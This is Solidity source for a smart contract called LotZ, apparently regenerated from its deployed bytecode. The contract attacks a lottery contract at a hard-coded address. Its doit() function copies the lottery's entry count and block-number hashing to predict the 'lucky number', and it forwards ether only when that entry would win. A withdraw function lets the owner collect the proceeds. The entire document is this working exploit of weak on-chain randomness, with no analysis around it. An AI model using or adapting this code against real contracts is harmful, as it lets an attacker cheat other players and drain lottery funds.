/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract LotZ at 0xdfdc6cf94d63181d9048c0c2f87c99efe9a256ad
*/
pragma solidity ^0.4.24;

contract TheInterface {
    function getTotalTickets() constant public returns (uint256);
}

contract LotZ {

    address private lotAddr = 0x53c2C4Ee7E625d0E415288d6e4E3F38a1BCB2038;
    address private owner;

    constructor() public {
        owner = msg.sender;
    }

    function doit() public payable {
        TheInterface lot = TheInterface(lotAddr);
        uint256 entry_number = lot.getTotalTickets() + 1;
        uint lucky_number = uint(keccak256(abi.encodePacked(entry_number + block.number, uint256(0))));
        require(lucky_number % 3 == 0);
        require(lotAddr.call.value(msg.value)());
    }

    function() public payable {
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

}